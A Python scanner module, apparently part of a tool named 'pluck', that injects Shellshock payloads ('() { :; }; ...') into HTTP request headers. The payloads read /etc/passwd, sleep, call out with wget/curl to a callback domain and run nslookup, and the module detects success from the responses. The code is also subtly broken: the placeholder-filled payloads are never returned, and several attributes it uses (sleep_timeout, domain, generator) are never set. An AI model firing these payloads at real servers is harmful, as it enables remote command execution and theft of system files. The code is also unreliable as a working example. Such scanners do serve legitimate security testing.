
from pluck.core import BaseModule, PayloadInjector, Finding
import pluck.settings as settings
from httplib import HTTPRequest, HTTPResponse,  HTTPRequestSender
import issuelib as issuelib
import random, string



class ShellShockTester(BaseModule):
    def __init__(self, request):
        super().__init__(request)
        self.name = "Shell Shock Tester"
        self.test_parameters = []
        self.injection_points = ["headers"]
        self.excluded_parameters = []
        self.generator = None

        self.unique_string = self.generate_unique_string()
        self.success_strings = []
        
    def generate_requests(self, payloads):
        # Create an injector
        injector = PayloadInjector(HTTPRequest(self.original_request.rebuild_request()))
        
        # Injection dictionary létrehozása
        injection_dict = injector.find_injection_points() # This stores an injection dictionary
        
        # return back the points which have least 1 parameter
        available_injection_points = injector.get_available_injection_points()

        #print(f"Generating requests for: Points: {str(self.injection_points)} and Parameters: {str(self.test_parameters)}")
        #print("Available Injection Points: ", available_injection_points)
        #print("Excluded Parameters: ", self.excluded_parameters)
        #print("Available Parameters: ")

        request_list = []
        # Minden feladat hozzáadása a queue-hoz
        for point in self.injection_points:
            if point in available_injection_points:
                print(f"Parameters for {point}: ", ', '.join(injector.get_injection_parameters(point)))
                for key in injection_dict[point]:
                    if key not in self.excluded_parameters:
                        if len(self.test_parameters) == 0 or key in self.test_parameters:
                            for p in payloads:
                                new_request = HTTPRequest(self.original_request.rebuild_request())
                                injector = PayloadInjector(new_request)
                                injector.inject_payload(point, key, p)
                                request_list.append((p, point, key, new_request))

        return request_list
    
    def send_requests(self, request_list):

        for payload, point, key, req in request_list:
            response = self.sender.send_request(req)
            if self.analyze_response(response):
                print(f"[!] Shell Shock Found in Point: {point} Parameter: {key}, Payload: {payload}. Request ID: {req.request_id}")
                break;

    def analyze_response(self, response):
        # check root in passwd
        for message in self.success_strings:
            if message.lower() in response.body.lower():
                return True

        # check sleep time
        if response.elapsed_time > self.generator.sleep_timeout:
            return True
        # check unique string in result
        
        if self.generator.unique_string in response.body:
            return True
        




        return False

    def generate_unique_string(self, length=16):
            return ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(length))


    def generate_payloads(self):
        shock_templates = [ 
            "() { :; }; PAYLOAD",
            "() { nothing;}; PAYLOAD"
            ]
        
        payloads = [
            '/bin/cat /etc/passwd',
            'echo \"UNIQUE\"',
            'sleep TIMEOUT',
            'wget http://DOMAIN/UNIQUE',
            'curl http://DOMAIN/UNIQUE',
            'nslookup DOMAIN'
        ]

        crafted_payloads = [p.replace('TIMEOUT', str(self.sleep_timeout)).replace("DOMAIN",self.domain).replace("UNIQUE", self.unique_string) for p in payloads]
        
        self.success_strings.append("root:x:0:0:root:/root")



        return [t.replace("PAYLOAD",p) for t in shock_templates for p in payloads]


    def run(self):
         # Generate payloads
        print(f"[*] Executing the {self.name} module")
        payloads = self.generate_payloads()

        generated_requests = self.generate_requests(payloads)

        #print("Generated Requests Count: "+ str(len(generated_requests)))
        self.send_requests(generated_requests)

